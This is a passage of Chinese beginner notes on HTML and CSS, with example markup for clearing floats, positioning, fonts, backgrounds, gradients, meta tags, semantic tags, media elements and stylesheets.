</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n# Clear清除浮动影响\n\n由于box1的浮动，导致box3位置上移。也就是box3收到了box1浮动的影响，位置发生了改变。\n\n如果我们不希望某个元素因为其他元素浮动的影响而改变位置，可以通过clear属性来清除浮动元素对当前元素所产生的影响\n\n作用：清除浮动元素对当前元素所产生的影响\n\n可选值：\n\n * left 清除左侧浮动元素对当前元素的影响\n\n * right 清除右侧浮动元素对当前元素的影响\n\n * both 清除两侧中最大影响的那侧\n\n原理：设置清除浮动以后，浏览器会自动为元素添加一个上外边距，以使其位置不受其他元素的影响\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n\n      div{\n        font-size: 50px;\n      }\n\n      .box1{\n        width: 200px;\n        height: 200px;\n        background-color: #bfa;\n        float: left;\n      }\n\n      .box2{\n        width: 400px;\n        height: 150px;\n        background-color: #ff0;\n        float: right;\n      }\n\n      .box3{\n        width: 200px;\n        height: 200px;\n        background-color: orange;\n        clear: both;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="box1">1</div>\n    <div class="box2">2</div>\n    <div class="box3">3</div> \n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n# 高度塌陷问题的解决方案\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n      .box1{\n        border: 10px red solid;\n\n        /* overflow: hidden; */\n      }\n\n      .box2{\n        width: 100px;\n        height: 100px;\n        background-color: #bfa;\n        float: left;\n      }\n\n      .box3{\n        clear: both;\n      }\n\n      .box1::after{\n        content: \'\';\n        display: block;\n        clear: both;\n      }\n\n    </style>\n  </head>\n  <body>\n\n    <div class="box1">\n      <div class="box2"></div>\n      \x3c!-- <div class="box3"></div> --\x3e\n    </div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n# clearfix\n\nclearfix 这个样式可以同时解决高度塌陷和外边距重叠的问题，当你在遇到这些问题时，直接使用clearfix这个类即可 。\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <style>\n      .box1{\n        width: 200px;\n        height: 200px;\n        background-color: #bfa;\n      }\n\n      /* .box1::before{\n      content: \'\';\n      display: table;\n      } */\n\n      .box2{\n        width: 100px;\n        height: 100px;\n        background-color: orange;\n        margin-top: 100px;\n      }\n\n      /* clearfix 这个样式可以同时解决高度塌陷和外边距重叠的问题，当你在遇到这些问题时，直接使用clearfix这个类即可 */\n      .clearfix::before,\n      .clearfix::after{\n        content: \'\';\n        display: table;\n        clear: both;\n      }\n    </style>\n  </head>\n  <body>\n\n    <div class="box1 clearfix">\n      <div class="box2"></div>\n    </div>\n\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# 定位\n\n# 定位简介\n\n定位（position）\n\n定位是一种更加高级的布局手段，通过定位可以将元素摆放到页面的任意位置。使用position属性来设置定位。\n\n * static 默认值，元素是静止的没有开启定位\n * relative 开启元素的相对定位\n * absolute 开启元素的绝对定位\n * fixed 开启元素的固定定位\n * sticky 开启元素的粘滞定位\n\n相对定位：\n\n当元素的position属性值设置为relative时则开启了元素的相对定位。\n\n相对定位的特点：\n\n 1. 元素开启相对定位以后，如果不设置偏移量元素不会发生任何的变化\n 2. 相对定位是参照于元素在文档流中的位置进行定位的\n 3. 相对定位会提升元素的层级\n 4. 相对定位不会使元素脱离文档流\n 5. 相对定位不会改变元素的性质块还是块，行内还是行内\n\n偏移量（offset）\n\n当元素开启了定位以后，可以通过偏移量来设置元素的位置\n\ntop\n\n * 定位元素和定位位置上边的距离\n\nbottom\n\n * 定位元素和定位位置下边的距离，定位元素垂直方向的位置由top和bottom两个属性来控制。通常情况下我们只会使用其中一\n * top值越大，定位元素越向下移动\n * bottom值越大，定位元素越向上移动\n\nleft\n\n * 定位元素和定位位置的左侧距离\n\nright\n\n * 定位元素和定位位置的右侧距离\n * 定位元素水平方向的位置由left和right两个属性控制。通常情况下只会使用一个\n * left越大元素越靠右\n * right越大元素越靠左\n\n# 绝对定位\n\n绝对定位\n- 当元素的position属性值设置为absolute时，则开启了元素的绝对定位\n- 绝对定位的特点：\n1.开启绝对定位后，如果不设置偏移量元素的位置不会发生变化\n2.开启绝对定位后，元素会从文档流中脱离\n3.绝对定位会改变元素的性质，行内变成块，块的宽高被内容撑开\n4.绝对定位会使元素提升一个层级\n5.绝对定位元素是相对于其包含块进行定位的\n\n包含块( containing block )\n- 正常情况下：\n包含块就是离当前元素最近的祖先块元素\n&lt;div> &lt;div>&lt;/div> &lt;/div>\n&lt;div>&lt;span>&lt;em>hello&lt;/em>&lt;/span>&lt;/div>\n\n- 绝对定位的包含块:\n包含块就是离它最近的开启了定位的祖先元素，\n如果所有的祖先元素都没有开启定位则根元素就是它的包含块\n- html（根元素、初始包含块）\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 固定定位\n\n将元素的position属性设置为fixed则开启了元素的固定定位。固定定位也是一种绝对定位，所以固定定位的大部分特点都和绝对定位一样，唯一不同的是固定定位永远参照于浏览器的视口进行定位。固定定位的元素不会随网页的滚动条滚动。\n\n# 粘滞定位\n\n当元素的position属性设置为sticky时则开启了元素的粘滞定位，粘滞定位和相对定位的特点基本一致，不同的是粘滞定位可以在元素到达某个位置时将其固定。\n\n<!DOCTYPE html>\n<html lang="en">\n\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>导航条</title>\n    <link rel="stylesheet" href="./css/reset.css">\n    <style>\n\n      body{\n        height: 3000px;\n      }\n\n      /* 设置nav的大小 */\n      .nav{\n\n        /* 设置宽度和高度 */\n        width: 1210px;\n        height: 48px;\n        /* 设置背景颜色 */\n        background-color: #E8E7E3;\n\n        margin:100px auto;\n\n        position: sticky;\n        top: 10px;\n\n      }\n\n      /* 设置nav中li */\n      .nav li{\n        /* 设置li向左浮动，已使菜单横向排列 */\n        float: left;\n        /* 设置li的高度 */\n        /* height: 48px; */\n        /* 将文字在父元素中垂直居中 */\n        line-height: 48px;\n\n      }\n\n      /* 设置a的样式 */\n      .nav a{\n        /* 将a转换为块元素 */\n        display: block;\n        /* 去除下划线 */\n        text-decoration: none;\n        /* 设置字体颜色 */\n        color: #777777;\n        /* 修改字体大小 */\n        font-size: 18px;\n\n        padding: 0 39px;\n      }\n\n      .nav li:last-child a{\n        padding: 0 42px 0 41px;\n      }\n\n      /* 设置鼠标移入的效果 */\n      .nav a:hover{\n        background-color: #3F3F3F;\n        color: #E8E7E3;\n      }\n    </style>\n  </head>\n\n  <body>\n    \x3c!-- 创建导航条的结构 --\x3e\n    <ul class="nav">\n      <li>\n        <a href="#">HTML/CSS</a>\n      </li>\n      <li>\n        <a href="#">Browser Side</a>\n      </li>\n      <li>\n        <a href="#">Server Side</a>\n      </li>\n      <li>\n        <a href="#">Programming</a>\n      </li>\n      <li>\n        <a href="#">XML</a>\n      </li>\n      <li>\n        <a href="#">Web Building</a>\n      </li>\n      <li>\n        <a href="#">Reference</a>\n      </li>\n    </ul>\n\n  </body>\n\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n\n\n# 绝对定位下的元素布局\n\n水平布局\n\nleft + margin-left + border-left + padding-left + width + padding-right + border-right + margin-right + right = 包含块的内容区的宽度\n\n当我们开启了绝对定位后，水平方向的布局等式就需要添加left 和 right 两个值。此时规则和之前一样只是多添加了两个值。当发生过度约束，如果9个值中没有 auto 则自动调整right值以使等式满足，如果有auto，则自动调整auto的值以使等式满足。\n\n可设置auto的值\n\n * margin\n * width\n * left\n * right\n\n因为left 和 right的值默认是auto，所以如果不指定left和right。则等式不满足时，会自动调整这两个值。\n\n垂直方向布局的等式的也必须要满足：\n\ntop + margin-top/bottom + padding-top/bottom + border-top/bottom + height = 包含块的高度\n\n# 元素层级\n\n对于开启了定位元素，可以通过z-index属性来指定元素的层级。z-index需要一个整数作为参数，值越大元素的层级越高，元素的层级越高越优先显示。如果元素的层级一样，则优先显示靠下的元素。祖先的元素的层级再高也不会盖住后代元素。\n\n\n# 字体和背景\n\n# 字体\n\n字体相关的样式：\n\n * color 用来设置字体颜色\n\n * font-size 字体的大小\n\nfont-size相关的单位\n\n * em 相当于当前元素的一个font-size\n\n * rem 相对于根元素的一个font-size\n\nfont-family 字体族（字体的格式）\n\n * serif 衬线字体\n\n * sans-serif 非衬线字体\n\n * monospace 等宽字体\n\n指定字体的类别，浏览器会自动使用该类别下的字体，font-family 可以同时指定多个字体，多个字体间使用,隔开\n\n字体生效时优先使用第一个，第一个无法使用则使用第二个 以此类推。\n\n# 图标字体\n\n图标字体（iconfont）\n\n * 在网页中经常需要使用一些图标，可以通过图片来引入图标，但是图片大小本身比较大，并且非常的不灵活\n * 所以在使用图标时，我们还可以将图标直接设置为字体，然后通过font-face的形式来对字体进行引入\n * 这样我们就可以通过使用字体的形式来使用图标。\n\nfontawesome 使用步骤\n\n 1. 下载 https://fontawesome.com/\n 2. 解压\n 3. 将css和webfonts移动到项目中\n 4. 将all.css引入到网页中\n 5. 使用图标字体\n\n直接通过类名来使用图标字体\n\nclass="fas fa-bell"\nclass="fab fa-accessible-icon"\n\n<i class="fas fa-bell" style="font-size:80px; color:red;"></i>\n<i class="fas fa-bell-slash"></i>\n<i class="fab fa-accessible-icon"></i>\n<i class="fas fa-otter" style="font-size: 160px; color:green;"></i>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n通过伪元素来设置图标字体\n\n 1. 找到要设置图标的元素通过before或after选中\n\n 2. 在content中设置字体的编码\n\n 3. 设置字体的样式\n\ncontent: \'\\f1b0\';\n/* font-family: \'Font Awesome 5 Brands\'; */\nfont-family: \'Font Awesome 5 Free\';\nfont-weight: 900; \ncolor: blue;\nmargin-right: 10px;\n\n\n1\n2\n3\n4\n5\n6\n\n\n阿里图标字体库\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>Document</title>\n    <link rel="stylesheet" href="./iconfont/iconfont.css">\n    <style>\n      i.iconfont{\n        font-size: 100px;\n      }\n\n      p::before{\n        content: \'\\e625\';\n        font-family: \'iconfont\';\n        font-size: 100px;\n      }\n    </style>\n  </head>\n  <body>\n\n    <i class="iconfont">&#xe61c;</i>\n    <i class="iconfont">&#xe622;</i>\n    <i class="iconfont">&#xe623;</i>\n\n    <i class="iconfont icon-qitalaji"></i>\n\n    <p>Hello</p>\n  </body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 字体设置\n\n行高（line height），行高指的是文字占有的实际高度。可以通过line-height来设置行高，行高可以直接指定一个大小（px em），也可以直接为行高设置一个整数。如果是一个整数的话，行高将会是字体的指定的倍数。行高经常还用来设置文字的行间距，行间距 = 行高 - 字体大小。\n\n字体框，字体框就是字体存在的格子，设置font-size实际上就是在设置字体框的高度，行高会在字体框的上下平均分配。\n\n字体可以使用下面的简写属性：\n\ndiv{\n  border: 1px red solid;\n  /* \n  font 可以设置字体相关的所有属性\n  语法：\n  font: 字体大小/行高 字体族\n  行高 可以省略不写 如果不写使用默认值\n  */\n\n  /* font-size: 50px;\n  font-family: \'Times New Roman\', Times, serif; */\n  font-weight: bold;\n  /* font: 50px/2  微软雅黑, \'Times New Roman\', Times, serif; */\n  /* font: normal normal 50px/2  微软雅黑, \'Times New Roman\', Times, serif; */\n  font: bold italic 50px/2  微软雅黑, \'Times New Roman\', Times, serif;\n  /* font:50px \'Times New Roman\', Times, serif;\n  line-height: 2; */\n\n  /* font-size: 50px; */\n  /* font-weight 字重 字体的加粗 \n  可选值：\n  normal 默认值 不加粗\n  bold 加粗\n  100-900 九个级别（没什么用）\n  font-style 字体的风格\n  normal 正常的\n  italic 斜体\n  */\n  /* font-weight: bold; */\n  /* font-weight: 500;\n  font-style: italic; */\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# 文本样式\n\ntext-align 文本的水平对齐\n\n * left 左侧对齐\n\n * right 右对齐\n\n * center 居中对齐\n\n * justify 两端对齐\n\nvertical-align 设置元素垂直对齐的方式\n\n * baseline 默认值 基线对齐\n\n * top 顶部对齐\n\n * bottom 底部对齐\n\n * middle 居中对齐\n\ntext-decoration 设置文本修饰\n\n * none 什么都没有\n\n * underline 下划线\n\n * line-through 删除线\n\n * overline 上划线\n\nwhite-space 设置网页如何处理空白\n\n * normal 正常\n\n * nowrap 不换行\n\n * pre 保留空白\n\n# 背景设置\n\nbackground-image 设置背景图片\n\n * 可以同时设置背景图片和背景颜色，这样背景颜色将会成为图片的背景色\n * 如果背景的图片小于元素，则背景图片会自动在元素中平铺将元素铺满\n * 如果背景的图片大于元素，将会一个部分背景无法完全显示\n * 如果背景图片和元素一样大，则会直接正常显示\n\nbackground-repeat 用来设置背景的重复方式\n\n * repeat 默认值 ， 背景会沿着x轴 y轴双方向重复\n\n * repeat-x 沿着x轴方向重复\n\n * repeat-y 沿着y轴方向重复\n\n * no-repeat 背景图片不重复\n\nbackground-position 用来设置背景图片的位置，通过 top left right bottom center 几个表示方位的词来设置背景图片的位置\n\n使用方位词时必须要同时指定两个值，如果只写一个则第二个默认就是center\n\n通过偏移量来指定背景图片的位置：水平方向的偏移量 垂直方向变量\n\nbackground-position: -50px 300px;\n\n设置背景的范围 background-clip\n\n * border-box 默认值，背景会出现在边框的下边\n\n * padding-box 背景不会出现在边框，只出现在内容区和内边距\n\n * content-box 背景只会出现在内容区\n\nbackground-origin 背景图片的偏移量计算的原点\n\n * padding-box 默认值，background-position从内边距处开始计算\n\n * content-box 背景图片的偏移量从内容区处计算\n\n * border-box 背景图片的变量从边框处开始计算\n\nbackground-size 设置背景图片的大小\n\n * 第一个值表示宽度\n\n * 第二个值表示高度\n\n如果只写一个，则第二个值默认是 auto，cover 图片的比例不变，将元素铺满。contain 图片比例不变，将图片在元素中完整显示。\n\nbackground-color\nbackground-image\nbackground-repeat\nbackground-position\nbackground-size\nbackground-origin\nbackground-clip\nbackground-attachment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nbackgound 背景相关的简写属性，所有背景相关的样式都可以通过该样式来设置。并且该样式没有顺序要求，也没有哪个属性是必须写的。\n\nbackground-size必须写在background-position的后边，并且使用/隔开，background-position/background-size。\n\nbackground-origin background-clip 两个样式 ，orgin要在clip的前边。\n\nbackground-attachment，背景图片是否跟随元素移动\n\n * scroll 默认值 背景图片会跟随元素移动\n\n * fixed 背景会固定在页面中，不会随元素移动\n\n# 渐变\n\n通过渐变可以设置一些复杂的背景颜色，可以实现从一个颜色向其他颜色过渡的效果，渐变是图片，需要通过background-image来设置\n\n线性渐变，颜色沿着一条直线发生变化，linear-gradient()\n\nlinear-gradient(red,yellow) 红色在开头，黄色在结尾，中间是过渡区域\n\n线性渐变的开头，我们可以指定一个渐变的方向\n\n * to left\n\n * to right\n\n * to bottom\n\n * to top\n\n * deg deg表示度数\n\n * turn 表示圈\n\n渐变可以同时指定多个颜色，多个颜色默认情况下平均分布，也可以手动指定渐变的分布情况\n\nrepeating-linear-gradient() 可以平铺的线性渐变\n\nradial-gradient() 径向渐变(放射性的效果)\n\n默认情况下径向渐变的形状根据元素的形状来计算的。正方形 --\x3e 圆形，长方形 --\x3e 椭圆形\n\n我们也可以手动指定径向渐变的大小\n\n * circle\n\n * ellipse\n\n也可以指定渐变的位置\n\nradial-gradient(大小 at 位置, 颜色 位置 ,颜色 位置 ,颜色 位置)\n\n大小\n\n * circle 圆形\n\n * ellipse 椭圆\n\n * closest-side 近边\n\n * closest-corner 近角\n\n * farthest-side 远边\n\n * farthest-corner 远角\n\n位置：\n\ntop right left center bottom\n\n\n# 动画\n\n\n# 响应式布局\n\n\n# 练习',normalizedContent:'# html & css 基础\n\n\n# html 标签\n\n\n# 实体\n\n如果我们在网页中编写的多个空格，默认情况会自动被浏览器解析为一个空格。另外在html中有些时候，我们不能直接书写一些特殊符号。比如：多个连续的空格，比如字母两侧的大于和小于号。如果我们需要在网页中书写这些特殊的符号，则需要使用html中的实体（转义字符）：\n\n&实体的名字;\n&nbsp; 空格\n&gt; 大于号\n&lt; 小于号\n&copy; 版权符号\n\n\n1\n2\n3\n4\n5\n\n\n\n# meta标签\n\nmeta主要用于设置网页中的一些元数据，元数据不是给用户看\n\n * charset 指定网页的字符集\n * name 指定的数据的名称\n * content 指定的数据的内容\n * keywords 表示网站的关键字，可以同时指定多个关键字，关键字间使用,隔开\n\nmeta主要用于设置网页中的一些元数据，元数据不是给用户看\ncharset 指定网页的字符集\nname 指定的数据的名称\ncontent 指定的数据的内容\n\nkeywords 表示网站的关键字，可以同时指定多个关键字，关键字间使用,隔开\n<meta name="keywords" content="网上购物,网上商城,手机,笔记本,电脑,mp3,cd,vcd,dv,相机,数码,配件,手表,存储卡,京东"/>\n<meta name="keywords" content="网购,网上购物,在线购物,网购网站,网购商城,购物网站,网购中心,购物中心,卓越,亚马逊,卓越亚马逊,亚马逊中国,joyo,amazon">\n\ndescription 用于指定网站的描述\n<meta name="description" content="京东jd.com-专业的综合网上购物商城,销售家电、数码通讯、电脑、家居百货、服装服饰、母婴、图书、食品等数万个品牌优质商品.便捷、诚信的服务，为您提供愉悦的网上购物体验!"/>\n网站的描述会显示在搜索引擎的搜索的结果中\n\ntitle标签的内容会作为搜索结果的超链接上的文字显示\n\n<meta name="keywords" content="网购,网上购物,在线购物,网购网站,网购商城,购物网站,网购中心,购物中心,卓越,亚马逊,卓越亚马逊,亚马逊中国,joyo,amazon">\n\ndescription 用于指定网站的描述\n网站的描述会显示在搜索引擎的搜索的结果中\ntitle标签的内容会作为搜索结果的超链接上的文字显示\n\n<meta name="description" content="京东jd.com-专业的综合网上购物商城,销售家电、数码通讯、电脑、家居百货、服装服饰、母婴、图书、食品等数万个品牌优质商品.便捷、诚信的服务，为您提供愉悦的网上购物体验!"/>\n\n--\x3e\n<meta name="keywords" content="html5,前端,css3">\n<meta name="description" content="这是一个非常不错的网站">\n\x3c!--\n<meta http-equiv="refresh" content="3;url=https://www.mozilla.org"> \n将页面重定向到另一个网站\n--\x3e\n\x3c!-- <meta http-equiv="refresh" content="3;url=https://www.baidu.com"> --\x3e\n<title>document</title>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 语义化标签\n\n在网页中html专门用来负责网页的结构，所以在使用html标签时，应该关注的是标签的语义，而不是它的样式。\n\n# 标题\n\n * h1 ~ h6 一共有六级标题\n\n * 从h1~h6重要性递减，h1最重要，h6最不重要\n   \n     -         h1在网页中的重要性仅次于title标签，一般情况下一个页面中只会有一个h1\n     -          一般情况下标题标签只会使用到h1~h3，h4~h6很少用\n     -         标题标签都是块元素\n     -          在页面中独占一行的元素称为块元素（block element）\n   \n\n<h1>一级标题</h1>\n<h2>二级标题</h2>\n<h3>三级标题</h3>\n<h4>四级标题</h4>\n<h5>五级标题</h5>\n<h6>六级标题</h6>\n\n\x3c!-- \nhgroup标签用来为标题分组，可以将一组相关的标题同时放入到hgroup\n\n--\x3e\n<hgroup>\n  <h1>回乡偶书二首</h1>\n  <h2>其一</h2>\n</hgroup>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n# 文字标签\n\n文字标签包含：\n\n * p： 块元素，表示一个段落\n * em：语音语调的加重，行内元素\n * strong：强调，表示内容重要\n * blockquote：长引用\n * q：短引用\n * br：换行\n\n\x3c!-- \np标签表示页面中的一个段落\n\np也是一个块元素\n--\x3e\n<p>在p标签中的内容就表示一个段落</p>\n<p>在p标签中的内容就表示一个段落</p>\n\n\x3c!-- \nem标签用于表示语音语调的一个加重\n\n在页面中不会独占一行的元素称为行内元素（inline element）\n--\x3e\n<p>今天天气<em>真</em>不错！</p>\n\n\x3c!-- \nstrong表示强调，重要内容！\n--\x3e\n<p>你今天必须要<strong>完成作业</strong>！</p>\n\n鲁迅说：\n\x3c!-- blockquote 表示一个长引用 --\x3e\n<blockquote>\n  这句话我是从来没有说过的！\n</blockquote>\n\n\x3c!-- \nq表示一个短引用\n--\x3e\n子曰<q>学而时习之，乐呵乐呵！</q>\n\n\x3c!-- \nbr标签表示页面中的换行\n--\x3e\n<br>\n<br>\n\n今天天气真不错\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n# 块元素和行内元素\n\n块元素（block element）\n\n * 在网页中一般通过块元素来对页面进行布局\n\n行内元素(inline element）\n\n * 行内元素主要用来包裹文字\n\n * 在块元素中放行内元素，而不会在行内元素中放块元素\n\n * 块元素中基本上什么都能放\n\n * p元素中不能放任何的块元素\n\n浏览器在解析网页时，会自动对网页中不符合规范的内容进行修正\n\n * 标签写在了根元素的外部\n * p元素中嵌套了块元素\n * 根元素中出现了除head和body以外的子元素\n\n# 布局标签\n\n * header 表示网页的头部\n * main 表示网页的主体部分(一个页面中只会有一个main)\n * footer 表示网页的底部\n * nav 表示网页中的导航\n * aside 和主体相关的其他内容（侧边栏）\n * article 表示一个独立的文章\n * section 表示一个独立的区块，上边的标签都不能表示时使用section\n * div 没有语义，就用来表示一个区块，目前来讲div还是我们主要的布局元素\n * span 行内元素，没有任何的语义，一般用于在网页中选中文字\n\n\n# 列表\n\n# 有序列表\n\n使用ol标签来创建无序列表，使用li表示列表项\n\n# 无序列表\n\n使用ul标签来创建无序列表，使用li表示列表项\n\n# 定义列表\n\n使用dl标签来创建一个定义列表，使用dt来表示定义的内容，使用dd来对内容进行解释说明\n\n<ul>\n  <li>结构</li>\n  <li>表现</li>\n  <li>行为</li>\n</ul>\n\n<ol>\n  <li>结构</li>\n  <li>表现</li>\n  <li>行为</li>\n</ol>\n\n\n<dl>\n  <dt>结构</dt>\n  <dd>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落</dd>\n  <dd>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落</dd>\n  <dd>结构表示网页的结构，结构用来规定网页中哪里是标题，哪里是段落</dd>\n</dl>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 超链接\n\n超链接可以让我们从一个页面跳转到其他页面，或者是当前页面的其他的位置\n\n使用 a 标签来定义超链接，href 指定跳转的目标路径。值可以是一个外部网站的地址，也可以写一个内部页面的地址。超链接是也是一个行内元素，在a标签中可以嵌套除它自身外的任何元素。\n\ntarget属性，用来指定超链接打开的位置，_self 默认值 在当前页面中打开超链接，_blank 在一个新的要么中打开超链接。\n\n可以直接将超链接的href属性设置为#，这样点击超链接以后，页面不会发生跳转，而是转到当前页面的顶部的位置。可以跳转到页面的指定位置，只需将href属性设置 #目标元素的id属性值。\n\n<a id="bottom" href="#">回到顶部</a>\n\n\n1\n\n\n\n# 图片标签\n\n图片标签用于向当前页面中引入一个外部图片，使用img标签来引入外部图片，img标签是一个自结束标签。 img这种元素属于替换元素（块和行内元素之间，具有两种元素的特点）。\n\n相关属性：\n\n * src 属性指定的是外部图片的路径（路径规则和超链接是一样的）\n * alt 图片的描述，这个描述默认情况下不会显示，有些浏览器会图片无法加载时显示，搜索引擎会根据alt中的内容来识别图片，如果不写alt属性则图片不会被搜索引擎所收录\n * width 图片的宽度 (单位是像素)\n * height 图片的高度\n   * 宽度和高度中如果只修改了一个，则另一个会等比例缩放\n   * 一般情况在pc端，不建议修改图片的大小，需要多大的图片就裁多大\n   * 但是在移动端，经常需要对图片进行缩放（大图缩小）\n\n<img src="./img/1.gif" alt="松鼠">\n\n<img width="200"  src="https://d2ggl082rr1mkp.cloudfront.net/category/ironman_preview_1521810286_220_310.jpeg" alt="钢铁侠">\n\n\n1\n2\n3\n\n\n\n# 内联框架\n\n内联框架，用于向当前页面中引入一个其他页面\n\n * src 指定要引入的网页的路径\n * frameborder 指定内联框架的边框\n\n<iframe src="https://www.qq.com" width="800" height="600" frameborder="0"></iframe>\n<h1>hello</h1>\n\n\n1\n2\n\n\n\n# 多媒体\n\naudio 标签用来向页面中引入一个外部的音频文件的，音视频文件引入时，默认情况下不允许用户自己控制播放停止。\n\n * controls 是否允许用户控制播放\n\n * autoplay 音频文件是否自动播放\n\n * 如果设置了autoplay 则音乐在打开页面时会自动播放\n\n * 但是目前来讲大部分浏览器都不会自动对音乐进行播放\n\n * loop 音乐是否循环播放\n\n\x3c!-- <audio src="./source/audio.mp3" controls autoplay loop></audio> --\x3e\n\x3c!-- <audio src="./source/audio.mp3" controls></audio> --\x3e\n\x3c!-- 除了通过src来指定外部文件的路径以外，还可以通过source来指定文件的路径 --\x3e\n<audio controls>\n  \x3c!-- 对不起，您的浏览器不支持播放音频！请升级浏览器！ --\x3e\n  <source src="./source/audio.mp3">\n  <source src="./source/audio.ogg">\n  <embed src="./source/audio.mp3" type="audio/mp3" width="300" height="100">\n</audio>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n使用video标签来向网页中引入一个视频，使用方式和audio基本上是一样的\n\n<video controls>\n  <source src="./source/flower.webm">\n  <source src="./source/flower.mp4">\n  <embed src="./source/flower.mp4" type="video/mp4">\n</video>\n\n\n1\n2\n3\n4\n5\n\n\n\n# 表格\n\n\n# 表单\n\n\n# css样式\n\n\n# css简介\n\n网页分成三个部分：\n\n * 结构(html)\n * 表现(css)\n * 行为(javascript)\n\ncss全称cascading style sheets，层叠样式表。网页实际上是一个多层的结构，通过css可以分别为网页的每一个层来设置样式\n\n而最终我们能看到只是网页的最上边一层。总之一句话，css用来设置网页中元素的样式。\n\n使用css来修改元素的样式，有以下三种方式：\n\n * 第一种方式(内联样式，行内样式)：\n   * 在标签内部通过style属性来设置元素的样式\n   * 使用内联样式，样式只能对一个标签生效，如果希望影响到多个元素必须在每一个元素中都复制一遍\n   * 并且当样式发生变化时，我们必须要一个一个的修改，非常的不方便\n   * 注意：开发时绝对不要使用内联样式\n\n<p style="color:red; font-size: 60px;">少小离家老大回，乡音无改鬓毛衰</p>\n\n<p style="color: red; font-size: 60px;">今天天气真不错！</p>\n\n\n1\n2\n3\n\n\n * 第二种方式（内部样式表）\n   \n   * 将样式编写到head中的style标签里，然后通过css的选择器来选中元素并为其设置各种样式\n   \n   * 可以同时为多个标签设置样式，并且修改时只需要修改一处即可全部应用\n   \n   * 内部样式表更加方便对样式进行复用\n   \n   * 我们的内部样式表只能对一个网页起作用，它里边的样式不能跨页面进行复用\n\n<style>\n\n  p{\n    color: green;\n    font-size: 50px;\n  }\n\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * 第三种方式 （外部样式表） 最佳实践\n   * 可以将css样式编写到一个外部的css文件中，然后通过link标签来引入外部的css文件\n   * 外部样式表需要通过link标签进行引入，意味着只要想使用这些样式的网页都可以对其进行引用。使样式可以在不同页面之间进行复用\n   * 将样式编写到外部的css文件中，可以使用到浏览器的缓存机制，从而加快网页的加载速度，提高用户的体验。\n\n<link rel="stylesheet" href="./style.css">\n\n\n1\n\n\np{\n    color: tomato;\n    font-size: 50px;\n}\n\n\n1\n2\n3\n4\n\n\n\n# 